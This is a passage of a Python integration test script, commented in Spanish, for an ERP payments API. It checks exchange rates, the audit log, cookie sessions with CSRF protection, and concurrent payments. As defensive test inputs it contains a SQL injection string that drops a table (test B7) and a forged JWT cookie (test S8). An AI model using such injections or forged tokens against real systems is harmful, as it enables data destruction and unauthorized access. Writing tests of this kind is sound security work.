e2 = error_interno("Error al crear gasto", IntegrityError("INSERT INTO registro_gastos", {}, Exception("fk_violation detail")))
chk("V15", "Errores internos no exponen SQL; devuelven código de referencia", "SELECT" not in e1.detail and "INSERT" not in e2.detail and "referencia" in e2.detail, f"{e2.detail}")

# TC oficial
hoy = str(datetime.date.today())
a = c.put("/tipo-cambio/", json={"fecha": hoy, "precio_compra": 3.70, "precio_venta": 3.71}, headers=H["logi"]).status_code
b = c.put("/tipo-cambio/", json={"fecha": hoy, "precio_compra": 3.80, "precio_venta": 3.71}, headers=H["teso"]).status_code
cc = c.put("/tipo-cambio/", json={"fecha": hoy, "precio_compra": 3.70, "precio_venta": 3.7125}, headers=H["teso"])
g_ = c.get(f"/tipo-cambio/{hoy}", headers=H["audi"])
chk("TC1", "TC oficial: Logística 403, compra>venta 400, Tesorería registra (4 decimales) y todos leen", (a, b, cc.status_code, g_.status_code) == (403, 400, 200, 200) and str(g_.json()["precio_venta"]).startswith("3.7125"), f"{a}/{b}/{cc.status_code}/{g_.status_code} venta={g_.json().get('precio_venta')}")
m = mk_maestro("F-TC"); d = mk_dam(m, "DAM-TC"); g = mk_gasto(d, c_otro.id_concepto, 100, "USD"); v = mk_voucher(1000, "PEN", num="OP-TC")
ok = pagar2(g, v["id_voucher"], "371.25", "PEN", "3.7125").status_code
db.expire_all(); log = db.query(models.AuditLog).filter(models.AuditLog.accion.like("%TIPO CAMBIO%")).count()
chk("TC2", "Pago al TC oficial aceptado; cambios de TC auditados", ok == 200 and log >= 1, f"pago={ok} logs_tc={log}")

# ==========================================
# 3b. FASE 3: BITÁCORA AUTOMÁTICA Y SESIÓN POR COOKIE
# ==========================================

print("\n=========== E) FASE 3: BITÁCORA AUTOMÁTICA ===========")
import json as _json
def logs(tabla=None, id_reg=None, accion=None, who="audi"):
    p = {"limit": 500}
    if tabla: p["tabla"] = tabla
    if id_reg is not None: p["id_registro"] = id_reg
    if accion: p["accion"] = accion
    r = c.get("/auditoria/", params=p, headers=H[who])
    return r.status_code, (r.json() if r.status_code == 200 else [])

m = mk_maestro("F-B1")
c.put(f"/maestros/{m}", json={"n_cont_fisico": "CONT-AAA"}, headers=H["logi"])
st, ev = logs("maestro_importaciones", m)
mod = [e for e in ev if e["accion"] == "MODIFICACION Contenedor" and "n_cont_fisico" in _json.loads(e["detalles"]).get("cambios", {})]
alta = [e for e in ev if e["accion"] == "ALTA Contenedor"]
chk("B1", "Alta y modificación de contenedor registradas con autor, IP, ruta y antes/después",
    st == 200 and alta and mod and mod[0]["nombre_usuario"] == "logi" and _json.loads(mod[0]["detalles"])["cambios"]["n_cont_fisico"] == [None, "CONT-AAA"] and mod[0]["endpoint"].startswith("PUT /maestros"),
    f"{st} altas={len(alta)} mods={len(mod)} -> {mod[0]['nombre_usuario'] if mod else ''} {mod[0]['endpoint'] if mod else ''} {_json.loads(mod[0]['detalles'])['cambios'] if mod else ''}")

b = c.post("/bancos/", json={"nombre": "BANCO B2"}, headers=H["teso"]).json()["id_banco"]
c.put(f"/bancos/{b}", json={"nombre": "BANCO B2 RENOMBRADO"}, headers=H["teso"])
c.request("DELETE", f"/bancos/{b}", headers=H["teso"])
st, ev = logs("cat_bancos", b)
chk("B2", "Catálogos: alta, renombre y desactivación lógica quedan trazados", st == 200 and len(ev) >= 3 and any("estado_registro" in e["detalles"] for e in ev), f"{len(ev)} eventos: {[e['accion'] for e in ev]}")

d = mk_dam(m, "DAM-B3"); g = mk_gasto(d, c_otro.id_concepto, 100, doc_n="B3-1"); v = mk_voucher(500, num="OP-B3")
p = pagar2(g, v["id_voucher"], 100).json()
st, ev = logs("vouchers_bancarios", v["id_voucher"])
saldo_ev = [e for e in ev if "saldo_disponible" in _json.loads(e["detalles"]).get("cambios", {})]
chk("B3", "Pago: el descuento del voucher queda trazado (500 -> 400) firmado por Tesorería",
    saldo_ev and _json.loads(saldo_ev[0]["detalles"])["cambios"]["saldo_disponible"] == ["500.00", "400.00"] and saldo_ev[0]["nombre_usuario"] == "teso",
    f"{[_json.loads(e['detalles'])['cambios'] for e in saldo_ev]}")
c.request("DELETE", f"/pagos/{p['id_pago']}", json={"motivo": "prueba de bitacora"}, headers=H["teso"])
st, ev = logs("registro_pagos", p["id_pago"])
chk("B4", "Anulación de pago: BAJA con snapshot de valores previos", any(e["accion"] == "BAJA Pago" and "valores_previos" in e["detalles"] for e in ev), f"{[e['accion'] for e in ev]}")

r = c.post("/usuarios/", json={"id_rol": 2, "username": "logi_b5", "email": "b5@empresa.pe", "password": "ClaveSegura123"}, headers=H["admin"])
st, ev = logs("usuarios", r.json()["id_usuario"], who="admin")
chk("B5", "Alta de usuario auditada sin exponer el hash de la contraseña", ev and "$2b$" not in ev[0]["detalles"] and '"hashed_password": "***"' in ev[0]["detalles"], ev[0]["detalles"][:140] if ev else "sin eventos")

# Un rollback no debe dejar rastro de un cambio que nunca ocurrió
antes = len(logs("vouchers_bancarios")[1])
r = pagar2(g, v["id_voucher"], "99999")  # sobrepago -> 400 tras haber descontado en memoria
despues = len(logs("vouchers_bancarios")[1])
chk("B6", "Operación rechazada (rollback) no deja eventos huérfanos en la bitácora", r.status_code == 400 and antes == despues, f"{r.status_code} eventos voucher {antes} -> {despues}")

st1, _ = logs(who="logi"); st2, _ = logs(who="teso")
r = c.get("/auditoria/", params={"tabla": "x'; DROP TABLE audit_logs;--"}, headers=H["audi"])
chk("B7", "Bitácora: solo Admin/Auditor la leen; filtro de tabla validado", (st1, st2, r.status_code) == (403, 403, 400), f"logi={st1} teso={st2} tabla_maliciosa={r.status_code}")


print("\n=========== F) FASE 3: SESIÓN POR COOKIE httpOnly + CSRF ===========")
from fastapi.testclient import TestClient as _TC
from dependencies import limiter as _lim
_lim.enabled = False
nav = _TC(main.app)  # cliente "navegador": conserva cookies entre peticiones
r = nav.post("/login", data={"username": "teso", "password": "Clave123!"})
set_cookie = r.headers.get("set-cookie", "")
chk("S1", "Login del navegador: token SOLO en cookie httpOnly+SameSite=Strict; el cuerpo no trae el JWT",
    r.status_code == 200 and "access_token" not in r.json() and r.json()["usuario"]["id_rol"] == 3
    and "erp_session=" in set_cookie and "httponly" in set_cookie.lower() and "samesite=strict" in set_cookie.lower(),
    f"{r.status_code} body={list(r.json().keys())} cookie_flags={[p.strip() for p in set_cookie.split(';')[1:]]}")

r = nav.get("/me")
chk("S2", "/me valida la sesión por cookie", r.status_code == 200 and r.json()["username"] == "teso", f"{r.status_code} {r.json()}")

b_sin = nav.post("/bancos/", json={"nombre": "BANCO CSRF"})
b_con = nav.post("/bancos/", json={"nombre": "BANCO CSRF OK"}, headers={"X-Requested-With": "XMLHttpRequest"})
chk("S3", "CSRF: escritura con cookie y sin X-Requested-With -> 403; con el header -> 200", (b_sin.status_code, b_con.status_code) == (403, 200), f"{b_sin.status_code}/{b_con.status_code}")

st, ev = logs("cat_bancos", b_con.json()["id_banco"])
chk("S4", "Escrituras por cookie quedan firmadas en la bitácora", ev and ev[0]["nombre_usuario"] == "teso", f"{ev[0]['nombre_usuario'] if ev else None}")

nav.post("/logout", headers={"X-Requested-With": "XMLHttpRequest"})
r = nav.get("/me")
chk("S5", "Logout elimina la cookie: /me -> 401", r.status_code == 401, f"{r.status_code}")

anon = _TC(main.app)
r = anon.get("/gastos/")
chk("S6", "Sin cookie ni Bearer -> 401", r.status_code == 401, f"{r.status_code} {det(r)}")

r = anon.post("/login", data={"username": "teso", "password": "Clave123!"}, headers={"X-Auth-Mode": "bearer"})
tok = r.json().get("access_token")
r2 = anon.get("/me", headers={"Authorization": f"Bearer {tok}"})
chk("S7", "Modo script (X-Auth-Mode: bearer) entrega token y funciona como Bearer (inversor_masivo.py)", bool(tok) and r2.status_code == 200, f"token={'sí' if tok else 'no'} /me={r2.status_code}")

forjada = _TC(main.app); forjada.cookies.set("erp_session", "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.firma-falsa")
r = forjada.get("/me")
chk("S8", "Cookie con JWT falsificado -> 401", r.status_code == 401, f"{r.status_code}")
_lim.enabled = True


# ==========================================
# 4. PRUEBA DE CONCURRENCIA REAL (PostgreSQL)
# ==========================================
print("\n=========== D) PRUEBA DE CONCURRENCIA REAL (PostgreSQL) ===========")
v_conc = mk_voucher(1000, num="OP-CONC-01")
id_v_conc = v_conc["id_voucher"]

gastos_conc = []
m_conc = mk_maestro("F-CONC-01")
d_conc = mk_dam(m_conc, "DAM-CONC-01")
for idx in range(20):
    g_id = mk_gasto(d_conc, c_otro.id_concepto, 100, doc_n=f"DOC-CONC-{idx:02d}")
    gastos_conc.append(g_id)

def lanzar_pago_hilo(item):
    idx, gasto_id = item
    client_thread = TestClient(main.app)
    headers_thread = {
        **H["teso"],
        "Idempotency-Key": f"conc-key-{idx:02d}"
    }
    body = {
        "id_gasto": gasto_id,
        "voucher_id": id_v_conc,
        "moneda": "USD",
        "importe": "100.00",
        "tipo_cambio": "1.00",
        "pago_moneda_cruzada": False
    }
    response = client_thread.post("/pagos/", json=body, headers=headers_thread)
    return idx, response.status_code, response.text

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    resultados = list(executor.map(lanzar_pago_hilo, enumerate(gastos_conc)))

status_codes = [r[1] for r in resultados]
count_200 = status_codes.count(200)
count_400 = status_codes.count(400)
count_409 = status_codes.count(409)
count_500 = status_codes.count(500)
otros_codes = [sc for sc in status_codes if sc not in (200, 400, 409)]

db.expire_all()
v_final = db.get(models.VoucherBancario, id_v_conc)
saldo_final = v_final.saldo_disponible

pagos_voucher = db.query(models.RegistroPago).filter_by(voucher_id=id_v_conc, estado_registro="ACTIVO").all()
suma_pagos = sum((p.monto_moneda_origen for p in pagos_voucher), Decimal("0.00"))

cond_a = (count_500 == 0)
# Con espera de bloqueo (lock_timeout) los pagos hacen cola: el saldo alcanza para 10 exactos
# y los otros 10 deben fallar por SALDO (400), no por colisión (409).
cond_b = (count_200 == 10 and count_400 == 10 and count_409 == 0)
cond_c = (saldo_final == Decimal("0.00"))
cond_d = (suma_pagos == Decimal("1000.00"))

concurrencia_ok = cond_a and cond_b and cond_c and cond_d
evid_conc = f"200: {count_200}, 400: {count_400}, 409: {count_409}, 500: {count_500}, otros: {otros_codes} | Saldo final: {saldo_final} | Suma debitada: {suma_pagos}"
chk("CONC-01", "Concurrencia real: 20 pagos simultáneos contra voucher de USD 1000", concurrencia_ok, evid_conc)

fallas = [x for x in R if not x[2]]
print(f"\nRESUMEN TOTAL: {len(R)-len(fallas)}/{len(R)} pruebas pasan." + (" Fallan: " + ", ".join(x[0] for x in fallas) if fallas else ""))

# ==========================================
# 5. LIMPIEZA FINAL DE LA BASE DE PRUEBAS
# ==========================================
print("\n[LIMPIEZA FINAL] Limpiando la base de datos importaciones_test ...")
db.close()
with engine_clean.connect() as conn:
    conn.execute(text("DROP SCHEMA public CASCADE; CREATE SCHEMA public;"))
print("✅ [LIMPIEZA FINAL] Esquema public limpiado.")

